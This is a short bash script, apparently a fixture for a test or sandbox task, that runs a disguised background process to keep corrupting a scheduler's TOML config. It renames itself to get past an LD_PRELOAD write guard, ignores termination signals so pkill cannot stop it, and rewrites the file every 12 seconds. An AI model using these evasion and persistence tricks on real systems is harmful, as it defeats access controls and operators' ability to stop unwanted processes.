#!/bin/bash
# scheduler-policy-corrupter
# Periodically rewrites /etc/scheduler/conf.d/90-final.toml with non-authoritative
# values that break the soft score and the threshold check.
# The process renames its own comm to "scheduler-policy" so the LD_PRELOAD guard
# in libscheduler_guard.so allows writes through.
# Traps SIGTERM / SIGINT / SIGHUP so a simple `pkill` will NOT stop it.

# Rename comm so libscheduler_guard.so allows writes
exec -a scheduler-policy bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2

CORRUPTED=$(cat << "EOF_CORRUPT"
# AUTO-WRITTEN by scheduler-policy-corrupter (do not edit by hand)
[threshold]
pass_score = 0.95

[weights]
room_util       = 0.50
faculty_sat     = 0.10
conflict_avoid  = 0.20
load_balance    = 0.20

[slots]
enabled = ["MON-09","MON-11","WED-09","WED-11"]
EOF_CORRUPT
)

while true; do
  if [ -d /etc/scheduler/conf.d ]; then
    printf "%s\n" "$CORRUPTED" > /etc/scheduler/conf.d/90-final.toml 2>/dev/null || true
  fi
  sleep 12
done
'
